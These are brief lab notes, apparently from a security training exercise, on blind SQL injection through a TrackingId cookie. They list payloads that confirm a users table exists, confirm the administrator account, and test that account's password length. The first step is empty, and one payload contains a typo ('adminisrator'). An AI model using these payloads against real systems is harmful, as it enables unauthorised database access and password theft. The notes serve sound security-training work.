## Exploiting blind SQL injection by triggering conditional responses

On this lab the TrackingID is vulnerable to SQL Injection.
For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

### 1 Confirm Blind SQL Injection


### 2 Confirm we have Users table
- ' and (select 'x' from users LIMIT 1)='x' --'
`trackingId = 'Rv4c456' and (select 'x' from users LIMIT 1)='x' --'`

### 3 Confirm that username administrator exists users table
- ' and (select username from users where username='administrator')='adminisrator'--'`
`trackingId = 'Rv4c456' and (select username from users where username='administrator')='adminisrator'--'`

### 4 Enumerate the password of administrator

##### Enumerate Password Length
- ' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
`trackingId = 'Rv4c456' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'`


#### Ref:
[Youtube video](https://www.youtube.com/watch?v=LBG_n9fr8sM)




>[!NOTE]
>The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.

